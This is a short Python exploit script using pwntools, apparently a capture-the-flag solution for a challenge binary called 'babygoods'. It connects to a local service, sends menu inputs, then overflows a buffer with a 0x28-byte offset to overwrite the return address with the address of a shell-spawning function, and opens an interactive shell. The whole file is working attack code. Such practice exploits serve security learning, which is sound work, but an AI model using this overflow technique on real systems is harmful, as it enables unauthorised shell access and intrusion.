#!/usr/bin/env python

from pwn import *

# set context binary, context log_level
elf = context.binary = ELF("./distribution/babygoods")
# context.log_level = 'debug'

# Start process
# p = process("./distribution/babygoods", stdin=process.PTY, stdout=process.PTY)
p = remote("127.0.0.1", 32345)

# Binsh function
binsh = p64(0x401236)
payload = flat({0x28: binsh})

# Easy bof
p.sendlineafter(b': ', "pwn")
p.sendlineafter(b':', "1")
p.sendlineafter(b':', "1")
p.sendlineafter(b':', payload)
p.interactive()
